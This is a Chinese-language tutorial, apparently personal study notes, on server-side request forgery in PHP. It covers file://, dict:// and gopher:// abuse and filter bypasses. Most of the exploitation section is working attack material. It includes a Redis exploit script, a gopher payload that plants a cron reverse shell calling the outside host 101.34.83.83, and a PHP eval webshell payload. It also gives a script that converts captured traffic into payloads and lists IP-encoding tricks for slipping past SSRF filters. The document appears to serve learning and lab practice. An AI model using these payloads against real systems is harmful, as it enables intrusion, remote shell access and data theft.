---
typora-copy-images-to: ../images
typora-root-url: ..
---



## SSRF漏洞



### 简介

SSRF(Server-Side Request Forgery)就是服务端请求伪造，它是一种由攻击者构造而从服务端发起请求的一个漏洞。攻击者在未能获得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在的内网。SSRF工具通常针对的是外部网络无法直接访问的内部系统。



### 漏洞成因

该漏洞形程的原因是服务端用于请求资源的地址参数可以被用户所控制并且它没有对目标地址进行过滤，例如：服务端使用指定的url来从服务器中获取资源。这会导致攻击者可以构造从服务端发起的请求。一般情况下SSRF攻击目标是内网，攻击者可以扫描内网主机，内网主机开放的端口等信息。同时SSRF漏洞可以结合伪协议来读取服务端文件内容。



### 漏洞的危害

SSRF会造成的危害：

* 攻击者可以扫描内网开放的服务信息
* 攻击者可以向内网主机发送payload来攻击内网服务
* 利用file 、gopher、dict协议读取本地文件、执行命令
* 攻击者可以发送payload给服务端，使其请求大文件，造成DOS攻击



### 常见的场景

SSRF可能出现的场景：

* 通过url地址分享的文章
* 社交分享功能：获取超链接的标题等内容进行显示
* 图片的加载和下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片
* 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
* 开发平台接口测试工具：一些公司会把自己的一些接口开放出来，形成第三方接口。这个时候他们通常会开发一个用于测试自己接口是否连通的web，给这些程序员测试接口，如果没有过滤好，就会造成ssrf



### 相关函数

这里只介绍在PHP中出现的和SSRF相关的函数，主要的有这三个：

* file_get_contents()

  file_get_contents()函数用于将文件读入一个字符串，它的函数原型如下：

  > file_get_contents(
  >   string `$filename`,
  >   bool `$use_include_path` = **`false`**,
  >   resource `$context` = ?,
  >   int `$offset` = 0,
  >   int `$length` = ?
  > ): string|false

  其中`filename`是要读取的文件的名称，这个可以是url，如果url中具有特殊字符例如空格，那么就需要进行url编码

  `use_include_path`用于触发搜索include_path，在include_path指定的目录列表下获取文件

  `context`是由stream_context_create()函数创建的有效的context资源

  `offset`是读取原始数据流的开始位置的偏移

  `length`是要读取数据的最大长度

* fsockopen()

  fsockopen()函数用于打开一个网络连接或者一个Unix套接字连接，它的函数原型如下：

  > fsockopen(
  >   string `$hostname`,
  >   int `$port` = -1,
  >   int `&$errno` = ?,
  >   string `&$errstr` = ?,
  >   float `$timeout` = ini_get("default_socket_timeout")
  > ): resource

  其中`hostname`是要连接的主机，`port`是端口号，`errstr`是错误信息字符串，`timeout`是连接超时时间。fsockopen()函数会返回一个文件句柄，可以被文件类函数调用。

* curl_exec()

  curl_exec()函数用于执行cURL 会话,这个函数应该在初始化一个 cURL 会话并且全部的选项都被设置后被调用。函数原型如下：

  > curl_exec(resource `$ch`): [mixed](https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed)

  其中`ch`是由curl_init()函数返回的cURL句柄

这三个函数使用不当就会造成SSRF漏洞



### 利用方法

一个简单的SSRF的demo:

```php
<?php 

function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url); 
```



#### 读取本地文件

可以通过PHP中的file协议来读取本地文件，file协议的作用是访问本地文件系统

file://协议的利用条件：

- `allow_url_fopen`:off/on
- `allow_url_include` :off/on

用法：

```
http://192.168.31.54/ssrf.php?url=file:///etc/passwd
```



#### 探测内网存活主机及服务

这里可以利用dict协议和 http/https协议来探测内网存活主机及服务

先获取目标主机的网络配置信息，通过读取读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie等文件来获取，从而获得目标主机的内网网段并进行爆破。

```
http://192.168.31.54/ssrf.php?url=file:///etc/hosts
```

域网IP地址范围分三类，以下IP段为内网IP段：

```
C类：192.168.0.0 - 192.168.255.255 
B类：172.16.0.0 - 172.31.255.255 
A类：10.0.0.0 - 10.255.255.255
```

探测内网主机是否存活payload

```
http://192.168.31.54/ssrf.php?url=http://192.168.31.1
```

这里可以通过burpsuite的Intruder模块来进行爆破

![image-20210710095737275](/images/image-20210710095737275.png)

payload的设置

![image-20210710095923307](/images/image-20210710095923307.png)

最后通过返回响应的长度判断主机是否存活

![image-20210710101758115](/images/image-20210710101758115.png)

当然，使用tubor intruder插件来爆破会更快，这里演示下用法，安装了tubor intruder后，单击右键选择将请求发送给tubor intruder

tubor intruder通过%s替代要被爆破的参数，它会有基本示例脚本供参考

![image-20210710103510416](/images/image-20210710103510416.png)

其中concurrentConnections 参数代表和服务器建立多少条连接，requestsPerConnection 参数代表每条连接同时发送多少个请求

engine.queue() 函数用于向队列中插入请求，这里的target.req是请求的模板，而str(i)就是%s要爆破的内容

![image-20210710103936563](/images/image-20210710103936563.png)



**探测内网主机服务**

通过dict协议来探测主机服务

payload:

```
http://192.168.31.54/ssrf.php?url=dict://192.168.31.54:80	//http
http://192.168.31.54/ssrf.php?url=dict://192.168.31.54:22 	//ssh
http://192.168.31.54/ssrf.php?url=dict://192.168.31.54:6379 //redis
```

![image-20210710104218968](/images/image-20210710104218968.png)

爆破的话可以写脚本也可以通过burpsuite



#### 攻击内网服务

##### **gopher协议基本使用**

**gopher协议简介**

Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。
Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这极大拓宽了 SSRF 的攻击面。

**gopher协议格式**

> URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流

其中`_`相当于一个连接符，可以设置为任意字符，不包括在为请求数据内

**gopher使用限制**

* PHP版本>=5.3 并且编译时带有--wite-curlwrappers
* JAVA JDK < 1.7
* Curl 低版本不支持，太高版本好像也不支持
* Perl 支持
* ASP.NET < 版本3



**利用gopher发送GET请求**

这里使用curl来发送请求，通过curl --version来查看版本及其支持的协议

```bash
root@ubuntu18:~# curl --version
curl 7.58.0 (x86_64-pc-linux-gnu) libcurl/7.58.0 OpenSSL/1.1.1 zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 (+libidn2/2.0.4) nghttp2/1.30.0 librtmp/2.3
Release-Date: 2018-01-24
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp 
Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP HTTP2 UnixSockets HTTPS-proxy PSL 
```



gopher协议发送数据的格式：

* 换行回车必须使用%0d%0a替代，不能但用%0a表示，如果存在多个参数，参数间的&也要进行URL编码
* 数据都需要进行URL编码
* 在进行URL编码时，`?`需要转码为%3f
* 发送的HTTP包数据末尾要加上%0d%0a，表示消息结束



服务端代码：

```php
<?php
    echo "name is ".$_GET["name"]."\n";
?>
```

构造一个GET型的HTTP包：

```
GET /test.php?name=test HTTP/1.1
Host: 192.168.31.54:8088
```

URL编码如下所示:

```
GET%20/test.php%3fname=test%20HTTP/1.1%0d%0aHost:%20192.168.31.237:8088%0d%0a
```

发送请求:

```
curl gopher://192.168.31.54:8088/_GET%20/test.php%3fname=test%20HTTP/1.1%0d%0aHost:%20192.168.31.237:8088%0d%0a
```

请求结果：
![image-20210711200736657](/images/image-20210711200736657.png)



**发送POST请求**

服务端代码：

```php
<?php
    echo "name is ".$_POST["name"]."\n";
?>
```

构造一个POST请求包：

```
POST /test.php HTTP/1.1
Host: 192.168.31.54:8088
Content-Type:application/x-www-form-urlencoded
Content-Length:11

name=test
```

进行URL编码：

```
POST%20/test.php%20HTTP/1.1%0d%0aHost:%20192.168.31.54:8088%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:11%0d%0a%0d%0aname=test%0d%0a
```

发送请求：

```
curl gopher://192.168.31.54:8088/_POST%20/test.php%20HTTP/1.1%0d%0aHost:%20192.168.31.54:8088%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:11%0d%0a%0d%0aname=test%0d%0a
```

请求结果：

![image-20210711201447467](/images/image-20210711201447467.png)



##### 攻击redis服务

Redis时一个开源的key-value型存储系统，通常被称为数据结构服务器。

通过gopher协议攻击内网Redis服务，如果内网中的Redis存在未授权访问漏洞，并且Redis服务以root权限运行时，可以利用gopher协议来攻击，通过写入定时任务来实现反弹shell，或者是写入一个webshell。

攻击redis的exp:

```sh
echo -e "\n\n\n*/1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1\n\n\n"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
```

通过socat捕获发送的数据

```
socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379
```

这会将本地的4444端口转发到redis服务的6379端口，访问4444端口就相当于访问服务器的6379端口

这里用docker来搭建redis的环境会遇到点小问题，执行exp.sh时它会返回找不到/var/spool/cron路径

```
root@823a5abb3710:/home# bash exp.sh 127.0.0.1 4444
OK
(error) ERR Changing directory: No such file or directory
OK
OK
OK
```

网上搜了一圈，没发现解决方法，最后发现是没有安装cron导致的，使用apt安装cron就解决了

exp.sh发送的数据

```
> 2021/07/12 08:59:52.654090  length=88 from=0 to=87
*3\r
$3\r
set\r
$1\r
1\r
$61\r



*/1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1



\r
< 2021/07/12 08:59:52.655009  length=5 from=0 to=4
+OK\r
> 2021/07/12 08:59:52.659635  length=57 from=0 to=56
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$16\r
/var/spool/cron/\r
< 2021/07/12 08:59:52.660353  length=5 from=0 to=4
+OK\r
> 2021/07/12 08:59:52.664951  length=52 from=0 to=51
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$4\r
root\r
< 2021/07/12 08:59:52.665614  length=5 from=0 to=4
+OK\r
> 2021/07/12 08:59:52.670266  length=14 from=0 to=13
*1\r
$4\r
save\r
< 2021/07/12 08:59:52.680492  length=5 from=0 to=4
+OK\r
> 2021/07/12 08:59:52.684576  length=14 from=0 to=13
*1\r
$4\r
quit\r
< 2021/07/12 08:59:52.684963  length=5 from=0 to=4
+OK\r
```

将捕获的数据转为适合的格式：

* 如果第一个字符是`>`或者`<`那么丢弃该行字符串，表示请求和返回的时间。
* 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。
* 将`\r`字符串替换成`%0d%0a`
* 空白行替换为`%0a`

抄来的转化脚本：

```py
#coding: utf-8
#author: JoyChou
import sys

exp = ''

with open(sys.argv[1]) as f:
    for line in f.readlines():
        if line[0] in '><+':
            continue
        # 判断倒数第2、3字符串是否为\r
        elif line[-3:-1] == r'\r':
            # 如果该行只有\r，将\r替换成%0a%0d%0a
            if len(line) == 3:
                exp = exp + '%0a%0d%0a'
            else:
                line = line.replace(r'\r', '%0d%0a')
                # 去掉最后的换行符
                line = line.replace('\n', '')
                exp = exp + line
        # 判断是否是空行，空行替换为%0a
        elif line == '\x0a':
            exp = exp + '%0a'
        else:
            line = line.replace('\n', '')
            exp = exp + line
print exp
```

最后转换结果为：

```
*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

结合gopher协议发起攻击请求

```
curl -v 'http://192.168.31.54:8088/ssrf.php?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'
```

然后，我就踩坑了，ubuntu下我反弹不回来一个shell，真的要命。

ubuntu对crontab的格式要求比较严格，这里写入crontab文件的内容如下：

```sh
REDIS0006þ󿾁=


*/1 * * * * bash -i >& /dev/tcp/101.34.83.83/6666 0>&1



ÿ¯
```

这里由于格式问题，所以不能加入crontab的任务队列中

![image-20210713101751547](/images/image-20210713101751547.png)

这里还有另一个坑点是执行 crontab 使用的是 `/bin/sh` , 而ubuntu下`/bin/sh` 软连接的是dash ，而不是 bash，那么如果直接在 cron 里面写 bash - i xx 的反弹是不可能成功的。。。。所以环境不要用ubuntu，用centos！

具体参考这篇文章：[redis getshell实战](https://xiaopo.org/posts/eb21dee.html#crontab)



反弹shell搞不了那就写个webshell意思意思

写入webshell的前提：

* 知道web目录的绝对路径
* 当前运行redis的用户在web目录有写权限

exp:

```sh
redis-cli -h $1 -p $2 config set dir /var/www/html/
redis-cli -h $1 -p $2 config set dbfilename shell.php
redis-cli -h $1 -p $2 set shell "\\n<?php eval(\$_POST['cmd']);?>\\n"
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
```

捕获的有效数据：

```
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$14\r
/var/www/html/\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$3\r
cmd\r
$32\r
\\n<?php eval($_POST['cmd']);?>\\n\r
*1\r
$4\r
save\r
*1\r
$4\r
quit\r
```

转换后的payload:

```
gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0acmd%0d%0a$32%0d%0a\\n<?php eval($_POST['cmd']);?>\\n%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

通过SSRF漏洞访问这一URL，最后可以发现webshell成功写入

![image-20210713104200363](/images/image-20210713104200363.png)




### 绕过方法

存在SSRF漏洞的功能可能会做白名单或者黑名单处理，用来阻止对内网服务及资源的访问。因此想要成功的进行SSRF攻击，需要对请求的参数地址做相关绕过的处理，这里记录一下常见的绕过方式



#### 限制了请求域名

当它限制了请求的地址为http://www.demo.com时，可以采用HTTP基本身份认证的方式绕过，如：

http://www.demo.com@www.evil.com

它会将@后面的当作域名



#### 限制请求IP不为内网地址

* 可以采用短网址绕过

* 可以采用指向任意域名的xip.io来绕过

  例如： 127.0.0.1.xip.io可以解析为127.0.0.1

* 利用进制转换绕过,127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433

  

其他各种指向127.0.0.1的地址

```
http://localhost/         # localhost就是代指127.0.0.1
http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
http://0.0.0.0/       # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
http://[::]:80/           # 在liunx下可用，window测试了下不行
http://127。0。0。1/       # 用中文句号绕过
http://①②⑦.⓪.⓪.①
http://127.1/
http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
```



#### 限制请求协议为http

这个可以采用302跳转，百度短地址，或者使用https://tinyurl.com生成302跳转地址

  

最后贴一个github项目[Server-Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery), 里面有各种bypass的payload







### REFERENCE

* https://www.cnblogs.com/zzjdbk/p/12970519.html
* https://www.cnblogs.com/linuxsec/articles/12684293.html
* https://cloud.tencent.com/developer/article/1610645
* https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/
* https://www.136.la/jingpin/show-172851.html
* https://www.yuque.com/pmiaowu/web_security_1/cs5l14#i3wZS
* https://joychou.org/web/phpssrf.html

